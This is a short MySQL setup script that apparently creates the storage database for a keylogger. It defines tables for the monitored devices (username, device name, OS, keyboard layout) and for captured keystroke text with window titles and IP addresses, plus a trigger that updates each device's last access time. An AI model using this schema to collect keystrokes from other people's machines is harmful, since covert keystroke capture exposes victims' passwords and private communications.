DROP DATABASE IF EXISTS `keylogger_data`;
CREATE DATABASE `keylogger_data`;
USE `keylogger_data`;

--
-- Table structure for table `devices`
--

CREATE TABLE IF NOT EXISTS `devices` (
    `uuid` VARCHAR(36) NOT NULL,
    `registered_on` DATETIME NOT NULL,
    `last_access` DATETIME NOT NULL,
    `cpu_desc` VARCHAR(256) NOT NULL,
    `device_name` VARCHAR(256) NOT NULL,
    `username` VARCHAR(256) NOT NULL,
    `device_type` VARCHAR(16) NOT NULL,
    `os_name` VARCHAR(32) NOT NULL,
    `keyboard_layout` VARCHAR(3) NOT NULL,
    PRIMARY KEY (`uuid`)
);

--
-- Table structure for table `records`
--

CREATE TABLE IF NOT EXISTS `records` (
    `uuid` VARCHAR(36) NOT NULL,
    `timestamp_begin` DATETIME NOT NULL,
    `timestamp_end` DATETIME NOT NULL,
    `window_title` VARCHAR(512) NOT NULL,
    `record_text` MEDIUMTEXT NOT NULL,
    `ip_address` VARCHAR(16) NOT NULL,
    PRIMARY KEY (`uuid`, `timestamp_begin`),
    FOREIGN KEY (`uuid`) REFERENCES devices(`uuid`) ON DELETE CASCADE
);

--
-- New trigger for the table `records`
-- After an insert, updates the `last_access` field
--

DELIMITER $$  

CREATE TRIGGER last_access_update
AFTER INSERT ON records
FOR EACH ROW 
BEGIN
    UPDATE devices d
    SET d.last_access = NEW.timestamp_begin 
    WHERE d.uuid = NEW.uuid;
END$$

DELIMITER ;